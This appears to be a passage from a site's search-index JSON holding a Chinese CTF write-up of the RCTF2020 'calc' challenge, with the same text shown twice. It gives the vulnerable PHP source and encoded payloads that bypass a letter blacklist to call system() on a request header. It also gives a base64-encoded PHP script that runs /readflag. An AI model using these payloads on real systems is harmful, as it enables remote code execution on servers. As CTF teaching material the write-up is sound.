\u770b\u4e00\u4e0b\u7981\u7528\u51fd\u6570\uff0c\u6ca1\u7981\u7528\u4efb\u4f55\u51fd\u6570\u3002\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u6784\u9020shell\u6765\u6267\u884c\u547d\u4ee4\uff0c\u4e00\u4e2a\u547d\u4ee4\u4e00\u4e2a\u547d\u4ee4\u5730\u6784\u9020\u592a\u6162\u4e86\u3002\u7531\u4e8e\u6784\u9020webshell\u7684\u5b57\u7b26\u88ab\u7981\u7528\u4e86\uff0c\u8fd9\u91cc\u8003\u8651\u901a\u8fc7 getallheaders \u6765\u83b7\u53d6\u8bf7\u6c42\u5934\u4fe1\u606f\u6765\u6267\u884c\u547d\u4ee4\uff1a ((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))() //('GEtALLHEADErs')() getallheaders \u51fd\u6570\u8fd4\u56de\u7684\u662f\u6570\u7ec4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 {} \u6765\u83b7\u53d6\u5176\u4e2d\u67d0\u4e2a\u952e\u7684\u503c\uff0c\u6784\u9020: (('getallheaders')()){111} \u5373\u53ef\u83b7\u53d6\u8bf7\u6c42\u4fe1\u606f\u7684headers\u4e2d\u7684 111 \u5c5e\u6027\u7684\u503c\uff0c\u518d\u901a\u8fc7system\u6765\u6267\u884c\u5373\u53ef\uff0c\u6784\u9020system\uff1a ((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))() // ('systEM')() \u6700\u7ec8payload\uff1a ((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))(((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))(){111}) //('systEM')(('GEtALLHEADErs')(){111}) \u5728header\u91cc\u9762\u6dfb\u52a0111\u5c5e\u6027\uff0c\u5373\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\u3002\u5728\u6839\u76ee\u5f55\u4e0b\u53d1\u73b0flag\u548creadflag\uff0c\u8001\u5957\u8def\u4e86\u3002\u3002\u3002\u76f4\u63a5\u5199\u5165php\u811a\u672c\uff0c\u53c2\u80032019*CTF\u7684mywebsql\u3002\u811a\u672c\u5185\u5bb9\uff1a <?php $d = array ( 0 => array ( \"pipe\" , \"r\" ), 1 => array ( \"pipe\" , \"w\" ), 2 => array ( \"file\" , \"/tmp/error-output.txt\" , \"a\" ) ); $process = proc_open ( '/readflag' , $d , $pipes , $cwd , $env ); if ( is_resource ( $process )) { $question = fread ( $pipes [ 1 ], 1024 ); $question = fread ( $pipes [ 1 ], 1024 ); $question = trim ( $question ); var_dump ( $question ); eval ( '$result = ' . $question . ';' ); fwrite ( $pipes [ 0 ], $result ); fclose ( $pipes [ 0 ]); var_dump ( $result ); // $flag = stream_get_contents($pipes[1]); $flag = fread ( $pipes [ 1 ], 1024 ); $flag = fread ( $pipes [ 1 ], 1024 ); $flag = fread ( $pipes [ 1 ], 1024 ); fclose ( $pipes [ 1 ]); var_dump ( $flag ); $return_value = proc_close ( $process ); echo \"command returned $return_value\\n \" ; } ?> \u5229\u7528base64\u7f16\u7801\u6267\u884cphp\u8bed\u53e5\uff1a php -c 1 -r \"eval(base64_decode('JGQgPSBhcnJheSgKICAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLAogICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksCiAgICAyID0+IGFycmF5KCJmaWxlIiwgIi90bXAvZXJyb3Itb3V0cHV0LnR4dCIsICJhIikKKTsKJHByb2Nlc3MgPSBwcm9jX29wZW4oJy9yZWFkZmxhZycsICRkLCAkcGlwZXMsICRjd2QsICRlbnYpOwppZiAoaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSB0cmltKCRxdWVzdGlvbik7CiAgICB2YXJfZHVtcCgkcXVlc3Rpb24pOwogICAgZXZhbCgnJHJlc3VsdCA9ICcuJHF1ZXN0aW9uLic7Jyk7CiAgICBmd3JpdGUoJHBpcGVzWzBdLCAkcmVzdWx0KTsKICAgIGZjbG9zZSgkcGlwZXNbMF0pOwogICAgdmFyX2R1bXAoJHJlc3VsdCk7CiAgICAvLyAkZmxhZyA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKICAgICRmbGFnID0gZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgJGZsYWcgPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkZmxhZyA9IGZyZWFkKCRwaXBlc1sxXSwxMDI0KTsKCiAgICBmY2xvc2UoJHBpcGVzWzFdKTsKICAgIHZhcl9kdW1wKCRmbGFnKTsKICAgIAogICAgJHJldHVybl92YWx1ZSA9IHByb2NfY2xvc2UoJHByb2Nlc3MpOwoKICAgIGVjaG8gImNvbW1hbmQgcmV0dXJuZWQgJHJldHVybl92YWx1ZVxuIjsKfQ=='));\" \u5373\u53ef\u83b7\u53d6flag\u3002 \u7b80\u5355\u8bb0\u5f55\u4e00\u4e0b\u6784\u9020\u7684\u5b57\u7b26\uff08\u4ee5\u540e\u53ef\u80fd\u6709\u7528\uff09\uff1a q: ((0/0).(0)){1}|((1).(0)){0} A: ((0/0).(0)){1} v: ((1/0).(0)){2}|((0).(0)){0} p: (((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0}) N: ((0/0).(0)){0} I: ((1/0).(0)){0} H: ((0/0).(0)){0}&((1/0).(0)){0} F: ((1/0).(0)){2} O: ((1/0).(0)){0}|((1/0).(0)){2} G: ((0/0).(0)){1}|((1/0).(0)){2} u: (((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0} t: ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0}) E: ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}) D: ((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}) L: (((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})) s: ((0/0).(0)){1}|((2).(0)){0} r: (((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0}) y: ((0/0).(0)){1}|((8).(0)){0} x: (((0/0).(0)){0}&((1/0).(0)){0})|((8).(0)){0} C: (((0/0).(0)){1}|((2).(0)){0})&(((0/0).(0)){1}|((1/0).(0)){2}) M: (((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})) \u53c2\u8003\uff1a https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#mywebsql","title":"RCTF2020"},{"location":"wp/RCTF/#web","text":"","title":"Web"},{"location":"wp/RCTF/#calc","text":"\u7531\u4e8e\u8fd9\u6b21\u592a\u96be\u4e86\u90fd\u4e0d\u4f1a\u505a\uff0c\u53ea\u80fd\u7b80\u5355\u8bb0\u4e00\u9053\u5173\u4e8e\u5199shell\u7684\u9898 \u7ed9\u4e86\u6e90\u7801\uff1a <?php error_reporting ( 0 ); if ( ! isset ( $_GET [ 'num' ])){ show_source ( __FILE__ ); } else { $str = $_GET [ 'num' ]; $blacklist = [ '[a-z]' , '[\\x7f-\\xff]' , '\\s' , \"'\" , '\"' , '`' , '\\[' , '\\]' , '\\$' , '_' , '\\\\\\\\' , '\\^' , ',' ]; foreach ( $blacklist as $blackitem ) { if ( preg_match ( '/' . $blackitem . '/im' , $str )) { die ( \"what are you want to do?\" ); } } @ eval ( 'echo ' . $str . ';' ); } ?> \u8ddf\u4e0a\u6b21\u7684\u56fd\u8d5b\u4e00\u9053\u9898\u6709\u70b9\u50cf\uff0c\u4e0d\u8fc7\u9650\u5236\u4e86\u5b57\u6bcd\u7684\u4f7f\u7528\u3002\u4e0d\u8fc7\u53ef\u4ee5\u5229\u7528PHP\u7684\u9519\u8bef\u8fd0\u7b97\u8fd4\u56de\u6765\u6784\u9020\u5b57\u6bcd 1/0 \u8fd4\u56de INF //0\u4e3a\u9664\u6570 0/0 \u8fd4\u56de NAN \u7531\u4e8e\u524d\u9762\u6ca1\u6709\u8fc7\u6ee4 {} \u3001 . \u548c () \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ed6\u4eec\u6765\u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u67d0\u4e2a\u5b57\u7b26\uff0c\u7ed3\u5408\u4e0a\u9762\uff0c\u50cf\u8fd9\u6837 ((1/0).(0)){0} / I ((0/0).(0)){1} / A .... \u7136\u540e\u5229\u7528\u4f4d\u8fd0\u7b97\u6765\u6784\u9020\u5176\u4ed6\u5b57\u7b26\uff0c\u5148\u5c1d\u8bd5\u5728\u5df2\u5f97\u5230\u5b57\u7b26\u4e2d\u8fdb\u884c | (\u6216)\u8fd0\u7b97\u6216\u8005 & \u8fd0\u7b97 a = [ 'A' , 'F' , 'I' , 'N' ] for i in a : for j in a : print i , j , chr ( ord ( i ) | ord ( str ( j ))) print i , j , chr ( ord ( i ) & ord ( str ( j ))) \u53d1\u73b0\u80fd\u5f97\u5230\u7684\u5b57\u7b26\u589e\u52a0\u4e86 O \u3001 G \u3001 H \uff0c\u8fd8\u662f\u592a\u5c11\uff0c\u5728\u4e00\u6b21\u4f4d\u8fd0\u7b97\u4e2d\u5b57\u6bcd\u4e4b\u95f4\u7684\u8fd0\u7b97\u57fa\u672c\u6ca1\u6709\u4e86\uff0c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6570\u5b57\u5b57\u7b26\u6765\u751f\u6210\u65b0\u7684\u5b57\u7b26\uff08\u628a\u4e0a\u9762\u7684\u811a\u672c\u6539\u4e00\u4e0b\u5373\u53ef\uff09\uff0c\u65b0\u751f\u6210\u4e86 q\u3001s\u3001u\u3001v\u3001w\u3001y \u6570\u5b57\u5b57\u7b26\u751f\u6210\u65b9\u5f0f\u8ddf\u53d6\u5b57\u7b26\u5dee\u4e0d\u591a\uff0c\u5229\u7528 . \u8fde\u63a5\u5b57\u7b26\u6539\u53d8\u7c7b\u578b\u7136\u540e\u901a\u8fc7 {} \u53d6\u67d0\u4e2a\u6570\u5b57\u5b57\u7b26\u3002\u603b\u7ed3\u4e00\u4e0b\u73b0\u5728\u80fd\u5f97\u5230\u7684\u5b57\u6bcd\uff1a A F I N O G H q s u v w y 0-9 \u518d\u5c06\u5f97\u5230\u7684\u5b57\u7b26\u76f8\u4e92\u8fdb\u884c\u4f4d\u8fd0\u7b97\uff08\u65e0\u9650\u5957\u5a03\uff09\uff0c\u5f97\u5230\uff1a u&v t q&v p u&O E u&N D s&v r H|D L s&O C .... (\u57fa\u672c\u6240\u6709\u5b57\u6bcd\u90fd\u53ef\u4ee5\u6784\u9020)\uff0c\u5176\u5b9e\u8fd9\u91cc\u6211\u60f3\u5230\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u7528\u6cd5\uff0c\u53ef\u4ee5\u6784\u9020\u51fachr\u51fd\u6570\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\u4efb\u610f\u5b57\u7b26\u4e86\uff0c\u7f3a\u70b9\u5c31\u662fpayload\u6709\u70b9\u957f\u3002\u3002\u3002\u3002 \u6839\u636e\u4e0a\u9762\u6211\u4eec\u5c31\u53ef\u4ee5\u5199\u51fa\u4e00\u4e9b\u51fd\u6570\u4e86\uff0c\u5148\u770b\u4e00\u4e0bphpinfo\u4fe1\u606f\uff0c\u8fd9\u91cc\u5229\u7528\u4e86php7\u7684\u7248\u672c\u7279\u6027\uff0c\u53ef\u4ee5 ('phpinfo')() \u8fd9\u6837\u6765\u6267\u884c\u51fd\u6570\u3002\u52a0\u4e0aphp\u5bf9\u51fd\u6570\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u6784\u9020\u5982\u4e0b\uff1a (((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){0}&((1/0).(0)){0}).((((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((1/0).(0)){0}).(((0/0).(0)){0}).(((1/0).(0)){2}).(((1/0).(0)){0}|((1/0).(0)){2}))() //('phpinfo')() \u770b\u4e00\u4e0b\u7981\u7528\u51fd\u6570\uff0c\u6ca1\u7981\u7528\u4efb\u4f55\u51fd\u6570\u3002\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u6784\u9020shell\u6765\u6267\u884c\u547d\u4ee4\uff0c\u4e00\u4e2a\u547d\u4ee4\u4e00\u4e2a\u547d\u4ee4\u5730\u6784\u9020\u592a\u6162\u4e86\u3002\u7531\u4e8e\u6784\u9020webshell\u7684\u5b57\u7b26\u88ab\u7981\u7528\u4e86\uff0c\u8fd9\u91cc\u8003\u8651\u901a\u8fc7 getallheaders \u6765\u83b7\u53d6\u8bf7\u6c42\u5934\u4fe1\u606f\u6765\u6267\u884c\u547d\u4ee4\uff1a ((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))() //('GEtALLHEADErs')() getallheaders \u51fd\u6570\u8fd4\u56de\u7684\u662f\u6570\u7ec4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 {} \u6765\u83b7\u53d6\u5176\u4e2d\u67d0\u4e2a\u952e\u7684\u503c\uff0c\u6784\u9020: (('getallheaders')()){111} \u5373\u53ef\u83b7\u53d6\u8bf7\u6c42\u4fe1\u606f\u7684headers\u4e2d\u7684 111 \u5c5e\u6027\u7684\u503c\uff0c\u518d\u901a\u8fc7system\u6765\u6267\u884c\u5373\u53ef\uff0c\u6784\u9020system\uff1a ((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))() // ('systEM')() \u6700\u7ec8payload\uff1a ((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}))))(((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))(){111}) //('systEM')(('GEtALLHEADErs')(){111}) \u5728header\u91cc\u9762\u6dfb\u52a0111\u5c5e\u6027\uff0c\u5373\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\u3002\u5728\u6839\u76ee\u5f55\u4e0b\u53d1\u73b0flag\u548creadflag\uff0c\u8001\u5957\u8def\u4e86\u3002\u3002\u3002\u76f4\u63a5\u5199\u5165php\u811a\u672c\uff0c\u53c2\u80032019*CTF\u7684mywebsql\u3002\u811a\u672c\u5185\u5bb9\uff1a <?php $d = array ( 0 => array ( \"pipe\" , \"r\" ), 1 => array ( \"pipe\" , \"w\" ), 2 => array ( \"file\" , \"/tmp/error-output.txt\" , \"a\" ) ); $process = proc_open ( '/readflag' , $d , $pipes , $cwd , $env ); if ( is_resource ( $process )) { $question = fread ( $pipes [ 1 ], 1024 ); $question = fread ( $pipes [ 1 ], 1024 ); $question = trim ( $question ); var_dump ( $question ); eval ( '$result = ' . $question . ';' ); fwrite ( $pipes [ 0 ], $result ); fclose ( $pipes [ 0 ]); var_dump ( $result ); // $flag = stream_get_contents($pipes[1]); $flag = fread ( $pipes [ 1 ], 1024 ); $flag = fread ( $pipes [ 1 ], 1024 ); $flag = fread ( $pipes [ 1 ], 1024 ); fclose ( $pipes [ 1 ]); var_dump ( $flag ); $return_value = proc_close ( $process ); echo \"command returned $return_value\\n \" ; } ?> \u5229\u7528base64\u7f16\u7801\u6267\u884cphp\u8bed\u53e5\uff1a php -c 1 -r \"eval(base64_decode('JGQgPSBhcnJheSgKICAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLAogICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksCiAgICAyID0+IGFycmF5KCJmaWxlIiwgIi90bXAvZXJyb3Itb3V0cHV0LnR4dCIsICJhIikKKTsKJHByb2Nlc3MgPSBwcm9jX29wZW4oJy9yZWFkZmxhZycsICRkLCAkcGlwZXMsICRjd2QsICRlbnYpOwppZiAoaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSB0cmltKCRxdWVzdGlvbik7CiAgICB2YXJfZHVtcCgkcXVlc3Rpb24pOwogICAgZXZhbCgnJHJlc3VsdCA9ICcuJHF1ZXN0aW9uLic7Jyk7CiAgICBmd3JpdGUoJHBpcGVzWzBdLCAkcmVzdWx0KTsKICAgIGZjbG9zZSgkcGlwZXNbMF0pOwogICAgdmFyX2R1bXAoJHJlc3VsdCk7CiAgICAvLyAkZmxhZyA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKICAgICRmbGFnID0gZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgJGZsYWcgPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkZmxhZyA9IGZyZWFkKCRwaXBlc1sxXSwxMDI0KTsKCiAgICBmY2xvc2UoJHBpcGVzWzFdKTsKICAgIHZhcl9kdW1wKCRmbGFnKTsKICAgIAogICAgJHJldHVybl92YWx1ZSA9IHByb2NfY2xvc2UoJHByb2Nlc3MpOwoKICAgIGVjaG8gImNvbW1hbmQgcmV0dXJuZWQgJHJldHVybl92YWx1ZVxuIjsKfQ=='));\" \u5373\u53ef\u83b7\u53d6flag\u3002 \u7b80\u5355\u8bb0\u5f55\u4e00\u4e0b\u6784\u9020\u7684\u5b57\u7b26\uff08\u4ee5\u540e\u53ef\u80fd\u6709\u7528\uff09\uff1a q: ((0/0).(0)){1}|((1).(0)){0} A: ((0/0).(0)){1} v: ((1/0).(0)){2}|((0).(0)){0} p: (((0/0).(0)){1}|((1).(0)){0})&(((1/0).(0)){2}|((0).(0)){0}) N: ((0/0).(0)){0} I: ((1/0).(0)){0} H: ((0/0).(0)){0}&((1/0).(0)){0} F: ((1/0).(0)){2} O: ((1/0).(0)){0}|((1/0).(0)){2} G: ((0/0).(0)){1}|((1/0).(0)){2} u: (((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0} t: ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){2}|((0).(0)){0}) E: ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2}) D: ((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}) L: (((0/0).(0)){0}&((1/0).(0)){0})|(((0/0).(0)){0}&((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})) s: ((0/0).(0)){1}|((2).(0)){0} r: (((0/0).(0)){1}|((2).(0)){0})&(((1/0).(0)){2}|((0).(0)){0}) y: ((0/0).(0)){1}|((8).(0)){0} x: (((0/0).(0)){0}&((1/0).(0)){0})|((8).(0)){0} C: (((0/0).(0)){1}|((2).(0)){0})&(((0/0).(0)){1}|((1/0).(0)){2}) M: (((0/0).(0)){0}&((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&(((1/0).(0)){0}|((1/0).(0)){2})) \u53c2\u8003\uff1a https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#mywebsql","title":"calc"}]}